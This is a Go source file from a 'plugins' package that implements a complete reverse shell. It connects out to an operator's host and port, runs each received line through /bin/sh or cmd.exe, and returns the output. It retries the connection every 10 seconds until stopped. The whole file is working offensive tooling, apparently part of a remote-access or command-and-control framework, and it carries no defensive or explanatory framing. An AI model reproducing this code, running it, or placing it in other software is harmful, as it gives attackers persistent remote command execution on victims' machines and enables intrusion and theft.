package plugins

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// ReverseShell connects back to an operator listener and serves a
// line-based shell: each line received is executed and its combined
// output is returned followed by a newline. The command "exit" (or a
// dropped connection) ends the session. Reconnects every 10 seconds
// until Stop is called.
type ReverseShell struct {
	host string
	port int

	stop   chan struct{}
	active bool
}

// NewReverseShell creates a session target for host:port.
func NewReverseShell(host string, port int) *ReverseShell {
	return &ReverseShell{host: host, port: port, stop: make(chan struct{})}
}

// Validate checks the connection parameters before dialing.
func (r *ReverseShell) Validate() error {
	if r.host == "" {
		return fmt.Errorf("host is required")
	}
	if r.port < 1 || r.port > 65535 {
		return fmt.Errorf("port out of range: %d", r.port)
	}
	return nil
}

// Start dials the listener and blocks until Stop is called.
func (r *ReverseShell) Start() {
	r.active = true
	defer func() { r.active = false }()
	for {
		select {
		case <-r.stop:
			return
		default:
		}
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", r.host, r.port), 10*time.Second)
		if err == nil {
			r.serve(conn)
			conn.Close()
		}
		select {
		case <-r.stop:
			return
		case <-time.After(10 * time.Second):
		}
	}
}

// Stop ends the session loop.
func (r *ReverseShell) Stop() {
	select {
	case <-r.stop:
	default:
		close(r.stop)
	}
}

func (r *ReverseShell) serve(conn net.Conn) {
	reader := bufio.NewReader(conn)
	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		cmd := strings.TrimSpace(line)
		if cmd == "" {
			continue
		}
		if strings.EqualFold(cmd, "exit") {
			return
		}
		conn.Write([]byte(r.exec(cmd) + "\n"))
	}
}

// Exec runs one command through the platform shell.
func (r *ReverseShell) exec(command string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/C", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("error: %v\n%s", err, out)
	}
	return string(out)
}
